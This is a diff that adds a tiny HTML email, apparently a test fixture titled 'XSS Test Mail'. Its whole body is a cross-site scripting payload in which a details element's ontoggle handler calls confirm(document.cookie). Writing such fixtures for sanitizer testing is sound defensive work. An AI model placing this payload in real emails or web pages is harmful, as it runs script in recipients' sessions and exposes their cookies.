@@ -1,0 +1,10 @@
+From: elizabeth.hernandez@enron.com
+To: portney@rff.org
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<details ontoggle="confirm(document.cookie)">
+   xss
+   <summary>click me</summary>xssxssxss
+  </details>
